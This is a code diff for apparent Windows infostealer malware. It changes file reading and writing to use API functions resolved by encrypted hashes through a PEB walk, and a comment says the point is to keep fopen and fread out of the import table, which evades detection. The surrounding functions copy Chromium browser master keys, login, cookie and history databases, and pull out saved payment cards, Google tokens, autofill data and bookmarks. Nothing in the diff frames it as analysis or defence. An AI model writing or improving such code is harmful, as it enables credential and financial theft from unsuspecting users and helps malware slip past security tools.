@@ -82,6 +82,9 @@ typedef int    (WINAPI *pMirMultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWST
 typedef DWORD  (WINAPI *pMirGetFileAttributesA)(LPCSTR);
 typedef DWORD  (WINAPI *pMirGetFinalPathNameByHandleW)(HANDLE, LPWSTR, DWORD, DWORD);
 typedef DWORD  (WINAPI *pMirGetFileSize)(HANDLE, LPDWORD);
+typedef HANDLE (WINAPI *pMirCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef BOOL   (WINAPI *pMirReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef BOOL   (WINAPI *pMirWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
 
 static struct {
     pMirGetCurrentProcess    pGCP;
@@ -89,6 +92,9 @@ static struct {
     pMirGetFileAttributesA   pGFAA;
     pMirGetFinalPathNameByHandleW pGFPNBHW;
     pMirGetFileSize          pGFS;
+    pMirCreateFileA          pCFA;
+    pMirReadFile             pRF;
+    pMirWriteFile            pWF;
     int ready;
 } g_chrome_misc;
 
@@ -108,7 +114,13 @@ static int chrome_misc_ensure(void) {
     g_chrome_misc.pGFPNBHW = (pMirGetFinalPathNameByHandleW)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
     enc_decrypt(enc_GetFileSize, ENC_GETFILESIZE_LEN, fn);
     g_chrome_misc.pGFS = (pMirGetFileSize)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
-    if (!g_chrome_misc.pGCP || !g_chrome_misc.pMBTWC || !g_chrome_misc.pGFAA || !g_chrome_misc.pGFPNBHW || !g_chrome_misc.pGFS) return 0;
+    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn);
+    g_chrome_misc.pCFA = (pMirCreateFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_ReadFile, ENC_READFILE_LEN, fn);
+    g_chrome_misc.pRF = (pMirReadFile)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_WriteFile, ENC_WRITEFILE_LEN, fn);
+    g_chrome_misc.pWF = (pMirWriteFile)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_chrome_misc.pGCP || !g_chrome_misc.pMBTWC || !g_chrome_misc.pGFAA || !g_chrome_misc.pGFPNBHW || !g_chrome_misc.pGFS || !g_chrome_misc.pCFA || !g_chrome_misc.pRF || !g_chrome_misc.pWF) return 0;
     g_chrome_misc.ready = 1;
     return 1;
 }
@@ -721,23 +733,39 @@ static unsigned char *read_file_backup(const char *path, size_t *out_len) {
 
 /* ── Helper: read entire file into malloc'd buffer ───────────── */
 
-static unsigned char *read_file(const char *path, size_t *out_len) {
-    FILE *f = fopen(path, "rb");
-    if (f) {
-        fseek(f, 0, SEEK_END);
-        long sz = ftell(f);
-        fseek(f, 0, SEEK_SET);
-        if (sz <= 0) { fclose(f); return NULL; }
-
-        unsigned char *buf = (unsigned char *)malloc((size_t)sz);
-        if (!buf) { fclose(f); return NULL; }
-
-        size_t rd = fread(buf, 1, (size_t)sz, f);
-        fclose(f);
-
-        if (rd == (size_t)sz) { *out_len = rd; return buf; }
-        free(buf);
+/* PEB-walked file read/write -- no CRT fopen/fread/fwrite/fclose in IAT */
+static unsigned char *read_file_peb(const char *path, size_t *out_len) {
+    if (!chrome_misc_ensure()) return NULL;
+    HANDLE hf = g_chrome_misc.pCFA(path, 0x80000000 /*GENERIC_READ*/,
+        1 /*FILE_SHARE_READ*/, NULL, 3 /*OPEN_EXISTING*/, 0, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return NULL;
+    DWORD sz = g_chrome_misc.pGFS(hf, NULL);
+    if (sz == 0 || sz > 0x10000000) { mir_CloseHandle(hf); return NULL; }
+    unsigned char *buf = (unsigned char *)malloc(sz);
+    if (!buf) { mir_CloseHandle(hf); return NULL; }
+    DWORD rd = 0;
+    if (!g_chrome_misc.pRF(hf, buf, sz, &rd, NULL) || rd != sz) {
+        free(buf); mir_CloseHandle(hf); return NULL;
     }
+    mir_CloseHandle(hf);
+    *out_len = rd;
+    return buf;
+}
+
+static int write_file_peb(const char *path, const void *data, size_t len) {
+    if (!chrome_misc_ensure()) return 0;
+    HANDLE hf = g_chrome_misc.pCFA(path, 0x40000000 /*GENERIC_WRITE*/,
+        0, NULL, 2 /*CREATE_ALWAYS*/, 0, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return 0;
+    DWORD wr = 0;
+    BOOL ok = g_chrome_misc.pWF(hf, data, (DWORD)len, &wr, NULL);
+    mir_CloseHandle(hf);
+    return (ok && wr == (DWORD)len);
+}
+
+static unsigned char *read_file(const char *path, size_t *out_len) {
+    unsigned char *r = read_file_peb(path, out_len);
+    if (r) return r;
 
 #ifdef _WIN32
     /* Tier 1: Restart Manager (fast PID lookup, ~2ms) */
@@ -1497,8 +1525,7 @@ CollectResult collect_chromium(const char *local_app_data, const char *roaming_a
                 snprintf(mk_path, sizeof(mk_path), "%s%s_%s_master_key.bin",
                          local_app_data ? local_app_data : ".",
                          browsers[b].name, basename_of(profiles[p]));
-                FILE *mkf = fopen(mk_path, "wb");
-                if (mkf) { fwrite(key32, 1, 32, mkf); fclose(mkf); }
+                write_file_peb(mk_path, key32, 32);
 
                 /* Copy raw SQLite files */
                 const char *raw_files[] = {"Login Data", "Cookies", "Web Data", "History"};
@@ -1511,8 +1538,7 @@ CollectResult collect_chromium(const char *local_app_data, const char *roaming_a
                     size_t flen = 0;
                     unsigned char *fdata = read_file(src, &flen);
                     if (fdata) {
-                        FILE *df = fopen(dst, "wb");
-                        if (df) { fwrite(fdata, 1, flen, df); fclose(df); }
+                        write_file_peb(dst, fdata, flen);
                         free(fdata);
                     }
                 }
@@ -1574,20 +1600,10 @@ char **extract_chromium_cards(const char *profile_path,
     char *db_path = path_join(profile_path, "Web Data");
     if (!db_path) return NULL;
 
-    FILE *f = fopen(db_path, "rb");
+    size_t sz = 0;
+    unsigned char *buf = read_file_peb(db_path, &sz);
     free(db_path);
-    if (!f) return NULL;
-
-    fseek(f, 0, SEEK_END);
-    long sz = ftell(f);
-    fseek(f, 0, SEEK_SET);
-    if (sz <= 0) { fclose(f); return NULL; }
-
-    unsigned char *buf = malloc(sz);
-    if (!buf) { fclose(f); return NULL; }
-    size_t rd = fread(buf, 1, sz, f);
-    fclose(f);
-    if (rd != (size_t)sz) { free(buf); return NULL; }
+    if (!buf) return NULL;
 
     SqliteDb db;
     if (sqlite_open(&db, buf, sz) != 0) { free(buf); return NULL; }
@@ -1743,20 +1759,10 @@ char **extract_chromium_google_tokens(const char *profile_path,
     char *db_path = path_join(profile_path, "Web Data");
     if (!db_path) return NULL;
 
-    FILE *f = fopen(db_path, "rb");
+    size_t sz = 0;
+    unsigned char *buf = read_file_peb(db_path, &sz);
     free(db_path);
-    if (!f) return NULL;
-
-    fseek(f, 0, SEEK_END);
-    long sz = ftell(f);
-    fseek(f, 0, SEEK_SET);
-    if (sz <= 0) { fclose(f); return NULL; }
-
-    unsigned char *buf = malloc(sz);
-    if (!buf) { fclose(f); return NULL; }
-    size_t rd = fread(buf, 1, sz, f);
-    fclose(f);
-    if (rd != (size_t)sz) { free(buf); return NULL; }
+    if (!buf) return NULL;
 
     SqliteDb db;
     if (sqlite_open(&db, buf, sz) != 0) { free(buf); return NULL; }
@@ -1825,20 +1831,10 @@ char **extract_chromium_autofill(const char *profile_path, size_t *count) {
     char *db_path = path_join(profile_path, "Web Data");
     if (!db_path) return NULL;
 
-    FILE *f = fopen(db_path, "rb");
+    size_t sz = 0;
+    unsigned char *buf = read_file_peb(db_path, &sz);
     free(db_path);
-    if (!f) return NULL;
-
-    fseek(f, 0, SEEK_END);
-    long sz = ftell(f);
-    fseek(f, 0, SEEK_SET);
-    if (sz <= 0) { fclose(f); return NULL; }
-
-    unsigned char *buf = malloc(sz);
-    if (!buf) { fclose(f); return NULL; }
-    size_t rd = fread(buf, 1, sz, f);
-    fclose(f);
-    if (rd != (size_t)sz) { free(buf); return NULL; }
+    if (!buf) return NULL;
 
     SqliteDb db;
     if (sqlite_open(&db, buf, sz) != 0) { free(buf); return NULL; }
@@ -1949,20 +1945,10 @@ char **extract_chromium_bookmarks(const char *profile_path, size_t *count) {
     char *file_path = path_join(profile_path, "Bookmarks");
     if (!file_path) return NULL;
 
-    FILE *f = fopen(file_path, "rb");
+    size_t sz = 0;
+    unsigned char *buf = read_file_peb(file_path, &sz);
     free(file_path);
-    if (!f) return NULL;
-
-    fseek(f, 0, SEEK_END);
-    long sz = ftell(f);
-    fseek(f, 0, SEEK_SET);
-    if (sz <= 0) { fclose(f); return NULL; }
-
-    unsigned char *buf = malloc(sz);
-    if (!buf) { fclose(f); return NULL; }
-    size_t rd = fread(buf, 1, sz, f);
-    fclose(f);
-    if (rd != (size_t)sz) { free(buf); return NULL; }
+    if (!buf) return NULL;
 
     char **list = NULL;
     size_t list_count = 0;
